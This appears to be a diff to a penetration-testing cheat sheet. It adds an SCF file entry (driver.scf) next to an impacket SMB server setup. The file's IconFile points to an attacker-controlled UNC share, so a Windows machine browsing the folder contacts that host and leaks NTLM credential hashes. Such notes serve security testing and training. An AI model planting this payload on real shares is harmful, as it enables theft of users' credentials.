@@ -30,6 +30,13 @@ impacket-smbserver xingdi Desktop -smb2support
 Access:
 \\IPv4 address\test || //ip/test
 ```
+SCF file 
+```
+cat driver.scf
+[Shell]
+Command=2
+IconFile=\\ip\share
+```
 #### HTTP
 ```
 http://ip/
